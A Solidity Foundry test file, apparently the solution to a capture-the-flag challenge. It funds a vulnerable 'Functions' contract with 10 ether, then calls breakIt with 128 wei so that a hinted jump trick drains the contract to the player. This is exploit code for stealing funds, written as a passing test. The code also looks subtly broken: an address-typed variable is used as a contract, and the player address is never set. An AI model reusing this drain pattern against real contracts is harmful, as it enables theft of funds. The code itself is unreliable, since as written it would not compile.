// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../lib/forge-std/src/Test.sol";
import "../src/Functions.sol";

//call it 128 to jump where you want it
contract VaultTest is Test {
    address internal functions;
    address internal player;

    function setUp() public {
        vm.deal(player, 11 ether);
        vm.startPrank(player);

        functions = new Functions{value: 10 ether}(); 
        vm.stopPrank();
        vm.deal(player, 1 ether);
    }

    function testAttack() public {
        vm.startPrank(player);
        functions.breakIt{value: 128}();
        assertEq(address(functions).balance, 0);
        assertEq(player.balance,11 ether);
        vm.stopPrank();
    }
}